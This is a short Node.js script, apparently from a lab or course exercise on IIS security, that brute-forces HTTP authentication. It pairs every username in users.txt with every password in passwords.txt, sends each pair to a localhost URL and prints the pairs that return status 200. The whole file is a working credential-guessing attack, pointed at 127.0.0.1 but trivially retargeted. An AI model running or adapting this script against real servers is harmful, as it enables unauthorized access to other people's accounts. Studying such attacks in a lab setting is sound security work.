"use strict";

const request = require("request");
const readline = require("readline");
const fs = require("fs");

const usersReader = readline.createInterface({
    input: fs.createReadStream("users.txt")
});
let passwordReader;
usersReader.on("line", user => {
    passwordReader = readline.createInterface({
        input: fs.createReadStream("passwords.txt")
    });
    passwordReader.on("line", password => {
        sendREquest("http://127.0.0.1/securityModel3IL/scripts/bruteForceIIS/server-test/", user, password)
            .then(() => console.log(`${user} => ${password}`))
            .catch(() => {});
    });
});

function sendREquest(url, username, password) {
    return new Promise((resolve, reject) => {
        request.get(url, {
            auth: {
                user: username,
                pass: password,
                sendImmediately: false
            }
        }).on("response", (response) => {
            if (response.statusCode === 200) {
                resolve();
            } else {
                reject();
            }
        });
    });
}